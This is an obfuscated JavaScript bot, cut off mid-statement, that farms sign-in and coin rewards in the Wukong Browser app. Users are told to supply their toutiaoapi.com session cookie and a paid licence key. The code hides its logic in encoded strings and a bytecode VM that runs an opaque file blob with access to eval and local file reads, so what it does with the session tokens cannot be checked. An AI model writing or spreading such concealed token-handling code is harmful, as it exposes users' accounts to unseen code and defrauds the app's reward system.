/*
@肥皂
悟空浏览器 8.1  没啥意思，要玩得玩吧。
脚本包含签到，宝箱，收取金币
抓取域名：toutiaoapi.com 自己找找
找到Cookie里的 sessionid值就可以。
变量 wkllqckapp   对应账号数据
变量 cdkey    对应脚本验证卡密。所有脚本通用。。
多账号@分割
十几分钟一次吧
*/
const $ = new Env('悟空浏览器');
const _0x2fb369=_0x31b6,_0x49d7ca=_0x577b;function _0x31b6(_0xe4807e,_0x2df063){const _0x53553c=_0x5355();return _0x31b6=function(_0x31b62f,_0x1a3103){_0x31b62f=_0x31b62f-0xb1;let _0x22c1ac=_0x53553c[_0x31b62f];if(_0x31b6['CycTde']===undefined){var _0x287365=function(_0x577b2e){const _0x3a5177='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x46d2c3='',_0xe411b6='';for(let _0x18027a=0x0,_0x1ae6f6,_0x2e42fd,_0x1d9f68=0x0;_0x2e42fd=_0x577b2e['charAt'](_0x1d9f68++);~_0x2e42fd&&(_0x1ae6f6=_0x18027a%0x4?_0x1ae6f6*0x40+_0x2e42fd:_0x2e42fd,_0x18027a++%0x4)?_0x46d2c3+=String['fromCharCode'](0xff&_0x1ae6f6>>(-0x2*_0x18027a&0x6)):0x0){_0x2e42fd=_0x3a5177['indexOf'](_0x2e42fd);}for(let _0x1da994=0x0,_0x50d561=_0x46d2c3['length'];_0x1da994<_0x50d561;_0x1da994++){_0xe411b6+='%'+('00'+_0x46d2c3['charCodeAt'](_0x1da994)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xe411b6);};_0x31b6['TPRRyP']=_0x287365,_0xe4807e=arguments,_0x31b6['CycTde']=!![];}const _0x4684c5=_0x53553c[0x0],_0x5e363e=_0x31b62f+_0x4684c5,_0x5eec3e=_0xe4807e[_0x5e363e];return!_0x5eec3e?(_0x22c1ac=_0x31b6['TPRRyP'](_0x22c1ac),_0xe4807e[_0x5e363e]=_0x22c1ac):_0x22c1ac=_0x5eec3e,_0x22c1ac;},_0x31b6(_0xe4807e,_0x2df063);}(function(_0x261c3d,_0x317200){const _0x3cce57=_0x31b6,_0x246849=_0x577b,_0x4c7514=_0x261c3d();while(!![]){try{const _0x572090=parseInt(_0x246849(0x178,'8L9$'))/0x1*(-parseInt(_0x3cce57(0x15e))/0x2)+-parseInt(_0x246849(0x16a,'%Y!R'))/0x3+parseInt(_0x3cce57(0x13f))/0x4*(parseInt(_0x3cce57(0xf8))/0x5)+-parseInt(_0x246849(0x187,'8rj*'))/0x6+-parseInt(_0x246849(0xdf,'4g)C'))/0x7*(parseInt(_0x246849(0x113,'VrrJ'))/0x8)+parseInt(_0x3cce57(0x133))/0x9+parseInt(_0x246849(0x191,'w^ll'))/0xa;if(_0x572090===_0x317200)break;else _0x4c7514['push'](_0x4c7514['shift']());}catch(_0xaf1ca1){_0x4c7514['push'](_0x4c7514['shift']());}}}(_0x5355,0x7a057));const VM=require('sablejs/runtime')(),path=require('path'),fs=require('fs'),cryptoJS=require(_0x49d7ca(0xff,'6PpF'));function _0x5355(){const _0x1c5f2c=['qufbvuHmwvC0tvaZwdrpsti3rK9rnfjrm0flruvlmLLnsuvhtdzcnKXbuvm1uuG1nJrcne5At0PnquLureXbueyZquHrt0DdrLnnnvntt0XswLfoqurAmJyZwKPgtKHdq0ruwePlvJzxu0fxnKvbuLyYmKPhufDgtfG0quXhqKvou1vkqLDeuZzqtLDin0fvwLPqr1vfqq','WPBcJ3T9oM/dM8oSW4VdPXqfW4rQzcBcImoAkv3dRsldVq','nJKWnJaWsurPrxb4','W7aRqwdcLbJcS8o3FbxcJMddMmk/ECk6WO3dVYvzhtpcMLJdOSkgW7RdNSo1BCkyWQRdImoOWPurW6WTrCo7nMdcM8omW6FcNJud','oSkrt2qbACoiWPhdUGBcKv8','WOXCkW','WRpcMCoChCoxW5/dQWn9iq','Dw5SAw5Ru3LUyW','fSoLW7bUsSkqiW','DxrMltG','m8o+m2e','x8kQyxXh','BxnN','iCkhWOhcJSoQW5SO','Aw5KzxG','sSoAoSkNWOpcNCkyqSoCqW','y2rRzxK','rmoaWQL1tutcQSoD','WP7cVZNdS8kfqSo0ja','EhH4Ea','WOZcPX/dTq','odq4nLL1wgLsza','hSksWRmniYddP8ogzmk6W6/dH8kJWP3dMmkWW51qqr/dUWlcTCoYBMb1e8oZWQWH','WQVcGCkMWOm','mHSzg8ohdZ/cUd/dSMRcGG','WP9/kHddHMpdSCoWEG3cIf4','yxbPns1UB3jTywWTBheUDg91DgLHB2fWAs5JB20','jM9Zx3zLCNnPB249mtaMDMvYC2LVBL9JB2rLpteXmZaMjNzLCNnPB25FBMfTzt0XlJmUmczWBhvNAw49mczHAwq9nJu4oszYB21FDMvYC2LVBJ0Yoq','y29TlMnHDc5YzwfKywXSlZeXmtGWicHmAw51EdSGvtSGqw5KCM9PzcaXmdSGEMHFq047ide2CYbqCM87iej1AwXKl1fluteUmtKXmJiYlJaWmJSGq3jVBMv0l1rutMv0vMvYC2LVBJPMnJe2zJy4zIaYmdiXlteWlteYiff1AwnwzxjZAw9UoJCWnwqWyJGXidiWmJeTmdGTmtiP','tmkJCN1Jtq','W4WTzxNcOtxcNa','zw5JB2rL','i8oJngK','WRJcRComWOZcO13dGConASoNCCkTra','yxntDhjPBMC','5lUJ55cg546V5Akd','zSkVkrDfow83','Cg9ZDa','s0j0','qZOV','C3rYAw5NAwz5','z2v0r2XVyMfS','cUAcN+EPUUA1J+INIowzQoAuTUMBHUMhKEw4GtO','WRSrBmkRvW','W4Kqtrm','zmk0gXf2ja','WOnBlv/cHSk3','smoBWQuGdcRdPCoq','Ahr0Chm6lY9HCgK1lw5VCM1HBc1SCs50B3v0AwfVyxbPlMnVBs9SDwnREwnHDc9ZAI92ms9PBMnVBwuVCgfNzv9KyxrHp21HBMLMzxn0x3zLCNnPB25Fy29Kzt0XmtuWmduMAwLKpq','rmoCWQ0','55s16isr546V5Akd','amk1W4u','AxneAxjLy3rVCNK','mJCZmZy3nvjXz0fqzq','xmonWOezgSoT','W7tcPwi/WQ5nuXO','C8kWw1OTWQ3dIHZdLa','v2VdG8kz','WOBdJNTgjCkH','CMvHzgrPCLn5BMm','Fmo+hrfyjxepWO4wWPFdGg8BWOXtWQKKWRNdJNLYW6ZdHmokFZXKW7PwWRiOW5LmuSopASkzWQpcUmormSoOpubLWONcOSkZWRe/vmo3kbuDWQ1CW78+W7JdQe4wWOixis11WR4zW4NdQZuFWPPHa8kstmojdam8W6iSF8o/WQi/AmkNyq','5lIQ6lsM5y+3cG','WPFdRGSDbSoAWQZdK3dcGqTFBW','zNjVBunOyxjdB2rL','z2v0vgLTzq','iSo+kfnYlq','yfTmsG','mdeYmZq1nJC4oq','Ahr0Chm6lY9HCgK1lw5VCM1HBc1SCs50B3v0AwfVyxbPlMnVBs9SDwnREwnHDc9NAxaVDJeVzgfPBhKVC2LNBI9KB25Lp21HBMLMzxn0x3zLCNnPB25Fy29Kzt0XmtmWmczPAwq9','W6xcOwukWRjdtHOMW7pdSW','W59ykvtdUG','mJiZmdyXneHxEu92wq','ia3cV8oKW6dcHxXdW6tdLbaaWPRcTG','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','mCoTnNL5','pMFcUgHzW4DdW7vvFmkikG7dTwTZaIFdOvy1iSorvmoasCoLgtpdSCk7AJe1k8kbjJO','AmkjWO7cJ8osjblcQW','tmk5DM5wxmkTWOjzW6hcIKiKza','W73dSY7dNepcGZlcQwlcUCoQqMG4DeNdRSk5W7VcTSoHW5xcP8ooWP4WESklDSosW6xdRSk3kwFdG8oXW7FcOqtcSXP8WRZcHXniWOukE8oUW45jWPJdMSkAWRlcLCkYpKPMW7FdK8omtSoZW5ddMI1Pi8kQWP9auCkjvmoyW7zWgKtcN8krW4tcLuhdOSkDW6WxWRBcRgfUlrldKmoAW5uOjLJcNL3cR2xcNSkTjgtcKCknCSkmW4lcNmoTv8o5W4hcOSk4WR3dJKzeoZinWO0sWRBdOJZdQYCjW5ZcJG5KWPvGWPvqW7BdOmk7W7rXWQjmW5O9','W7ScWRjhW6fkWOT0W4tcUZG','y29Kzq','CMKLlCosW4fQWP7cIqBdNSojW4FcLSogW6XSmq','sSoMW4uWm08','yxbWBgLJyxrPB24VANnVBJSGy2HHCNnLDd1vveyToa','Af7cG8oQ','u8oAWOOFgSoGWP7cR14uumoW','CM91BMq','C2nVCMvFyw1VDw50','kmkdWOldHmkjW7m','yNvNz2vY','EfRdQmk3WQJdSIi','y2f0y2G','W7GiWRvJ','smkUz1Plv8kFW4qf','W6qcWQHWW6Dn','W4GQEKFcLdtcTCksouFdJZ7cImk9gmoU','vCoPW4S','W7xcOhO/WRK','qgxcOmkwWOBdP8kfWPmJWOLvmG7cGZZdOc9iWOXha8oQW6BcJ8oEW41UW7tdVmkzcSogW7VcK1jeumojahtcJ8oIWPiLwh46ncDHfCorDGKVW7faWPxcRd3dKqhdTSozBN/cQ8k4kx0CbmoIqM9XmLhcUsXYqsrSaWxdQ09+WQJcMI8pW6ipy8kMWPtcTCkThSktW5WsBCk7AcxcJqbmWPr5bSoXEahcRHxcSuqjWRzSaCoOW4xcQ8kAcmkBqSojbtRdRmkpWPfNWPpdQXtdGGORD0nbW4pcPNdcUw7cMYxcOW','nCknrgW6','D3jPDgvgAwXL','r+AbRUEQIUA3LoIKR+wBTow+UEwVIEETLSo3','d8kGsNRcMsqPW4fYkv1tWRC','Ahr0Chm6lY9HCgK1lw5VCM1HBc1SCs50B3v0AwfVyxbPlMnVBs9SDwnREwnHDc9NAxaVDJeVzgfPBhKVDhjLyxn1CMvFyM94l2rVBMu/BwfUAwzLC3rFDMvYC2LVBL9JB2rLpteXntaWnszPAwq9','W6xdS8ohasL+','W4zgpeNcPSk3jeNdR0vurYddK8kiWQTZWRuLvCkaWPNcUtGBW4NcHgtdHNvkWOqtxhOaWOGkdmo5imkwW4VcV8oeWRfYW6pdNMq7WRisW5r+WOvFWRCu','hmkkWQitcsZdOSoxtmkH','gSkNrwJcMra','EmoJW4hcH8olW7ldSh0wWOVcNa','WOnbkuZcS8kMfhJdVuvaxsFdMCkc','rmoaWQL1v0i','W7hcKrK','cbGjW5hdOmk9nSkQdgdcPmo2W7ddR8oUWOyHWRtdICk7nCkfWQtdN2L+W6BdHNhcGuCGWQtcNtxcMqxdS8kWyvqIW5JcJSkaW5LyW6FdTSoziCk2W6bHoG','iLBdQejUymksW6u','sCoEo8kNWO8','y2HHCKnVzgvbDa','CMfUzg9T','cUAcN+EPUUA1J+INIowzQoE0R+IUOEAuTUEBIJO','zxjYx3rPChm','CCk8s1S','qCoRW4i','lI9VDxrWDxrFzMLUywWUANm','cUAcN+EPUUA1J+INIowzQoAuTUwpLUMhKEw4GtO','dhNcTmolW4RdPCkDW5WIWP8BoaRcM38','W7NdV8kmW4ZdVaxcMSo2F8k9','tSk4qhTqumkfWPa','pMFcUgHzW4DdW7vvFmkikG7dTwTZaIFdOvy1iSoruSoasCoKgtJdP8ksyIi5sCoAEYf9WQVdQSo8hG3dVxRdPmoaq1FdGqauhSoxWRJcVgFdRq','gtBcHSouW5TgmG','jNvWzgf0zv92zxjZAw9Ux2nVzgu9mte1mda1jMrLDMLJzv9Pzd0','iIKOkq','l3n5CY9JBgfZCY9Uzxq','FSoeWRhdRSkjW7JdTZy','6zYd6B+W54+t5Ao5','hmoVW6Xmx8kB','CZ0Wo3a9ma','ChjVDg90ExbL','5B2J5yUL6k2r5Aw55y6b5OUI6kkD6lER5y+d6zIH5yIf5lQ+','5lIt6lAz5y6+W7NdH8oFW5SgWPvtraxcKSkypvfp','WQZcNmoLlSo+EqZdTt3dGmkjWQddQCkvxJ/dLKvCespcVcv1WOxdHYRcU2K','DgmGkmopW7DRWQ7cNXRdMa','W7VcMCovcmkB','WRFcL8oeiCouW5pdSeHLjH0','ChvZAa','qZOVv2LUzg93CY9ZExn0zw0UDhH0','DSoOW5hcSSobW5ldPG','D2TSBhfJA2fWCa','C2v0uhjVCgvYDhK','A8k5fardoa','jEAbLoEPQEA1GoINQUwzKEEULEwlHW0','WQJcMmoK','zgf0yq','iqdcVmoMWRxcJxDfWRdcQLz+W7ddLMjWFMHKW6ddMZS0afiFvvbhWRxcOmkYW57cOCk6ubnTWO7dKmonESkNWQ/dGKHxWOhcQCoODva','CMvHzezPBgvtEw5J','W6NdQmkAW57dOq/cSSoQDCoJrmkutSkO','y3jLyxrLrNvUy3rPB24','Dw5ZAgLMDa','mJy5mZu0mhb0BKLYqG','W6BdTCky','ExL5Eq','mZa0ndi','aSkgW51qxSkRWRlcOW','nCkiFSkivhu','ySk8u18','W4O6yfpcHt3cQmojEa','DEAbVEEQUEA0RUIMGUwyQ+w+HUwSR+EUVoInOUw8LSos','6k+W5zko77YD5OcS5OEp56cy6kED6iwL5P245Bkb6z+O5lIp57gh57Ms54Ii54cW77Y3776P772277YB5l2n5y6K5P6Pl+ATKEAEP+s8IU+9Ta','jMjIpte','jMLKpq','Bf7cO8oQACkSWR1l','Dg9tDhjPBMC','Bg9N','zgrK','W5W8FXS','C2v0','zMLUywXSEq','qujdrevgr0HjsKTmtu5puffsu1rvvLDywvPHyMnKzwzNAgLQA2XTBM9WCxjZDhv2D3H5EJaXmJm0nty3odKRlZ0','m1FdR1byAW','zMXVB3i','WOZcVaxdQmkf','jMLWptaMBwfJpq','W4OQCKNcRt7dICk9W47cOmoDtmocDhdcJW','sdvVW6KXWQO','iCkEWPC','W7VdJ8oJW4FdKaDbomktW5SjW7u','Aw5KzxHpzG','BgvUz3rO','jMLWpteMBwfJpq','AxnoB2rL','WOmwtG','W63cIW3dLG','o391x8o7a2fGWQNcKXpdNSoKhcjjB8ovnbHZWPldQmoOg8kDW6FcM8kMWQlcHSos','y3jLyxrLu3rYAw5N','WRpcKNrSd3i','W48PzuW','WOlMG7JNQRZMTzJOPzVLMy3ML43PM5FPHAFLU47OJ7BLVBlcHW','yNvMzMvY','W7hcOwuoWQLbwW','iIWIC2nLBMvFA2v5iJOIAxbFDgfZAYj9','DMfSDwu','u01bWPtdTmk4B8o3swe','W67dUCou','AsjAnCkQwYv4W6ZcSJFcG8ohr3XFACoCqbL2WOpcGSoNmCk1WQVdKCoCW4BdOCkQkfTrnCocewmRhCojcSk1WRzznmkrbKBdVI7dKhOLW6xdPvhdGmo9WQZcKmkVWOPlo2ldRCoWWO/dNfhcSJyNWRNcSSo/cCo7yCkEWPDRW70ElCoiW6RdKIFdTZlcUSorjs/dUhG9W4hcNSoueCo2Cmo0nsJcJCkeW5uUWPrfkCkLWOaNf2i3g8k7W6KYW6xcM8kOWOuRfuHHW7WeWPbHW6HnEmkbW5HjuuNdP8kummkaWP5iCCkZWQH9','WRVcKq3dOCoHEdOfnt0WWQFdV8kmb8oTWQZcHmoWENOUwa3dMSoHjgZcKCk5eSodWOFcSuKQpWpdQrhdTCkXW5hdJSoNyCkqW7VcGmohWOS2WO/cImkfWPW0t8kQWPb0C8onW4Cwjmk2i3FcR8ouoCoPWRpdMSoKk8kEiSoKWPOuqwnDW6fsWOPQlmoFp8ocWOHoW4v+W57dOCo/tZ0','BCkYwa','mtiWma','W6tdR8ks','iWWmfSoscqK','jCkqWPdcI8o/W4OCW4BdU8kNW6a+n8oRWRW','F2JcOxWuWPncW49fDCkBlqi','Cg9W','zxjYx25V','rxJcOSovWQBdRSkqW48sWOnqmW','mZvbDw5KtMi','z2v0zgf0yq','zM9YrwfJAa','nJCZmZCXDfnXExnv','y2fSBa','hSoYidKsaCotW4DtW43cIgazxW','s8oEj8kWWOxcNW','F3FcVfLrW51sWPKr','5B6d5yQ354MD5PYY772un8kAWRldGW','nCksWPNcG8o/','CgfYC2u','W6zDm8o1h8oLW4TnW4lcJhJcMCkkwUwhIa','y2HHCKf0','C2vZC2LVBMLKpq','ywnJzxnZu3LUyW','neDQzLDHAq','WQCvCmk/rSkG','A1tcG8oTCSkQWR1fWOxcUW','atZcN8ow','w1PbWOxcRCk8umoQtw3dVSkH','EMFcRMPDW4e','xmoPW5lcPSk8WRuUWPZdI8kB','uXtcVCoHW7dcHCkD','WQFcG8oLDq','mty1otm2nduYmW'];_0x5355=function(){return _0x1c5f2c;};return _0x5355();}function initVM(){const _0x68d9f6=_0x49d7ca,_0x5c26f1=_0x31b6;vm=new VM();const _0x1d9f68=vm[_0x5c26f1(0x172)](),_0x1da994=vm[_0x68d9f6(0xb1,'DMxD')](),_0x50d561=vm[_0x5c26f1(0xf6)](_0x68d9f6(0x127,'!4mL'),function(){const _0x219539=_0x68d9f6,_0x2092e2=_0x5c26f1,_0x2171e8=[];for(let _0x368da4=0x0;_0x368da4<arguments[_0x2092e2(0x115)];_0x368da4++){_0x2171e8[_0x2092e2(0xea)](vm[_0x219539(0xd9,'kuHe')](arguments[_0x368da4]));}return console[_0x2092e2(0x106)](..._0x2171e8),vm[_0x219539(0xc9,'$yLR')]();}),_0x41f450=vm[_0x5c26f1(0xf6)]('xxxx',function(_0x4a4f7d){const _0x2a412d=_0x5c26f1,_0x2fad4c=_0x68d9f6;let _0x16bb21=eval(_0x4a4f7d[_0x2fad4c(0x193,'kLV7')]);return vm['createString'](JSON[_0x2a412d(0x171)](_0x16bb21));}),_0xdc8a4b=vm[_0x68d9f6(0x196,'kuHe')](_0x5c26f1(0xfa),function(_0x14ba10){const _0x412c53=_0x68d9f6,_0x25ef02=_0x5c26f1;let _0x1227d3=_0x14ba10[_0x25ef02(0x122)],_0x579d3f=fs[_0x25ef02(0xf4)](_0x1227d3,_0x25ef02(0x152))[_0x412c53(0x12a,'1yhl')](/\r\n/g,'\x0a'),_0x40b32e=cryptoJS[_0x412c53(0x16f,'F0vb')](_0x579d3f)['toString']();return vm[_0x25ef02(0x11b)](_0x40b32e);}),_0x315678=vm[_0x68d9f6(0xf5,'%Y!R')](_0x5c26f1(0x107),function(_0x29c78f){const _0x260519=_0x5c26f1,_0x1a0bdc=_0x68d9f6;let _0x3cd670=cryptoJS[_0x1a0bdc(0x17c,'4g)C')](_0x29c78f[_0x260519(0x122)])[_0x260519(0x105)]();return vm[_0x1a0bdc(0x143,'ZT2@')](_0x3cd670);});return vm[_0x5c26f1(0xee)](_0x1da994,_0x5c26f1(0x106),_0x50d561),vm['setProperty'](_0x1d9f68,_0x5c26f1(0x15c),_0x41f450),vm[_0x68d9f6(0x18e,'it79')](_0x1d9f68,'console',_0x1da994),vm[_0x68d9f6(0xe9,'69(Z')](_0x1d9f68,_0x5c26f1(0xfa),_0xdc8a4b),vm[_0x68d9f6(0x198,'Eh29')](_0x1d9f68,'ddd',_0x315678),vm['run'](fs[_0x5c26f1(0xf4)](_0x5c26f1(0xd5))[_0x68d9f6(0x104,'$Fcf')]()),vm;}function destroyVM(_0x42a821){_0x42a821['destroy']();}function abc(_0x12aac2,_0x1ea2ef,_0xa9996b,_0x12aec9,_0x3fca63){const _0x22de88=_0x31b6,_0x122f10=_0x49d7ca,_0x174838=_0x12aac2['getGlobal']();let _0x3ce499=_0x12aac2['getProperty'](_0x174838,'xab'),_0x2be01e=_0x12aac2[_0x122f10(0xfe,'!4mL')](_0x3ce499,_0x12aac2[_0x122f10(0x12b,'AnoE')](),_0x12aac2[_0x22de88(0x11b)](_0x1ea2ef),_0x12aac2['createString'](_0x12aec9),_0x12aac2['createString'](_0x3fca63),_0x12aac2['createString'](_0xa9996b));return _0x2be01e=_0x12aac2[_0x22de88(0x16b)](_0x2be01e),_0x2be01e;}function xyz(_0x48fb7b,_0x11b62c,_0x3616bc,_0x1354ef,_0xcf843b){const _0x1f4756=_0x31b6,_0x41e825=_0x49d7ca,_0x227ebc=_0x48fb7b['getGlobal']();let _0x457720=_0x48fb7b[_0x41e825(0xc8,'!c*W')](_0x227ebc,_0x41e825(0xbc,'wua*')),_0x54cbdf=_0x48fb7b[_0x1f4756(0x134)](_0x457720,_0x48fb7b['createUndefined'](),_0x48fb7b[_0x41e825(0x161,'1yhl')](_0x11b62c),_0x48fb7b[_0x1f4756(0x11b)](_0x1354ef),_0x48fb7b[_0x1f4756(0x11b)](_0xcf843b),_0x48fb7b['createString'](_0x3616bc));return _0x54cbdf=_0x48fb7b[_0x41e825(0x16d,'#5qw')](_0x54cbdf),_0x54cbdf;}var gtr;let ml='',mac='',status;function _0x577b(_0xe4807e,_0x2df063){const _0x53553c=_0x5355();return _0x577b=function(_0x31b62f,_0x1a3103){_0x31b62f=_0x31b62f-0xb1;let _0x22c1ac=_0x53553c[_0x31b62f];if(_0x577b['VBRLCf']===undefined){var _0x287365=function(_0x3a5177){const _0x46d2c3='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0xe411b6='',_0x18027a='';for(let _0x1ae6f6=0x0,_0x2e42fd,_0x1d9f68,_0x1da994=0x0;_0x1d9f68=_0x3a5177['charAt'](_0x1da994++);~_0x1d9f68&&(_0x2e42fd=_0x1ae6f6%0x4?_0x2e42fd*0x40+_0x1d9f68:_0x1d9f68,_0x1ae6f6++%0x4)?_0xe411b6+=String['fromCharCode'](0xff&_0x2e42fd>>(-0x2*_0x1ae6f6&0x6)):0x0){_0x1d9f68=_0x46d2c3['indexOf'](_0x1d9f68);}for(let _0x50d561=0x0,_0x41f450=_0xe411b6['length'];_0x50d561<_0x41f450;_0x50d561++){_0x18027a+='%'+('00'+_0xe411b6['charCodeAt'](_0x50d561)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x18027a);};const _0x577b2e=function(_0xdc8a4b,_0x315678){let _0x2171e8=[],_0x368da4=0x0,_0x4a4f7d,_0x16bb21='';_0xdc8a4b=_0x287365(_0xdc8a4b);let _0x14ba10;for(_0x14ba10=0x0;_0x14ba10<0x100;_0x14ba10++){_0x2171e8[_0x14ba10]=_0x14ba10;}for(_0x14ba10=0x0;_0x14ba10<0x100;_0x14ba10++){_0x368da4=(_0x368da4+_0x2171e8[_0x14ba10]+_0x315678['charCodeAt'](_0x14ba10%_0x315678['length']))%0x100,_0x4a4f7d=_0x2171e8[_0x14ba10],_0x2171e8[_0x14ba10]=_0x2171e8[_0x368da4],_0x2171e8[_0x368da4]=_0x4a4f7d;}_0x14ba10=0x0,_0x368da4=0x0;for(let _0x1227d3=0x0;_0x1227d3<_0xdc8a4b['length'];_0x1227d3++){_0x14ba10=(_0x14ba10+0x1)%0x100,_0x368da4=(_0x368da4+_0x2171e8[_0x14ba10])%0x100,_0x4a4f7d=_0x2171e8[_0x14ba10],_0x2171e8[_0x14ba10]=_0x2171e8[_0x368da4],_0x2171e8[_0x368da4]=_0x4a4f7d,_0x16bb21+=String['fromCharCode'](_0xdc8a4b['charCodeAt'](_0x1227d3)^_0x2171e8[(_0x2171e8[_0x14ba10]+_0x2171e8[_0x368da4])%0x100]);}return _0x16bb21;};_0x577b['iMAAPT']=_0x577b2e,_0xe4807e=arguments,_0x577b['VBRLCf']=!![];}const _0x4684c5=_0x53553c[0x0],_0x5e363e=_0x31b62f+_0x4684c5,_0x5eec3e=_0xe4807e[_0x5e363e];return!_0x5eec3e?(_0x577b['ZJfgLt']===undefined&&(_0x577b['ZJfgLt']=!![]),_0x22c1ac=_0x577b['iMAAPT'](_0x22c1ac,_0x1a3103),_0xe4807e[_0x5e363e]=_0x22c1ac):_0x22c1ac=_0x5eec3e,_0x22c1ac;},_0x577b(_0xe4807e,_0x2df063);}status=(status=$['getval'](_0x49d7ca(0x145,'wua*'))||'1')>0x1?''+status:'',JSNAMED=$[_0x2fb369(0x117)]()?require(_0x49d7ca(0xd3,'!4mL'))[_0x49d7ca(0x180,'it79')](__filename):_0x49d7ca(0x14f,'69(Z');let 